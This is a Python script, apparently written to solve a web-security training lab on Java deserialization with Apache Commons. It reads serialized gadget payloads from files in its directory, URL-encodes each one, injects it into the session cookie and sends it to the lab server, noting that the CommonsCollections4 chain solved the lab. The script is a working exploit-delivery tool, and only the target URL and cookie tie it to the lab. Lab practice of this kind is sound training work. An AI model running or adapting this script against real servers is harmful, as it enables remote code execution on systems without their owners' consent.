#   Open dir
#   read payloads
#   send the payload
#
# u need to be in the same directory to run this file 
# CommonsCollections4 -> solved the lab
# Lab Name : Exploiting Java deserialization with Apache Commons
import os
import urllib.parse
import time
import requests

burp0_url = "https://0aad0011038bea79808258f90066004c.web-security-academy.net:443/"
burp0_cookies = {"session": "rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBmbDcyeWVpejdyaXhiMW5iYWJ1b3ZrdjJnMzRwaWE0cXQABndpZW5lcg%3d%3d"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://0aad0011038bea79808258f90066004c.web-security-academy.net/my-account?id=wiener", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

system = os.walk('.')

for root , dir , files , in system :
    for file in files:
        if file.find(".") != -1 :
            continue

        print("testing for " +file)
        eachfile = open(f"./{file}",'r')
        payload_base64 = eachfile.readline()
        payload_urlencoded = urllib.parse.quote(payload_base64)

        burp0_cookies["session"] = payload_urlencoded
        
        r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        print(r.status_code)
        if r.status_code == 400 :
            print(file)
            print(r)
            print(r.text)
      #      print(r.raw)
        time.sleep(5)
        # print(payload_urlencoded) # Cookie
        print("####################################")
        eachfile.close()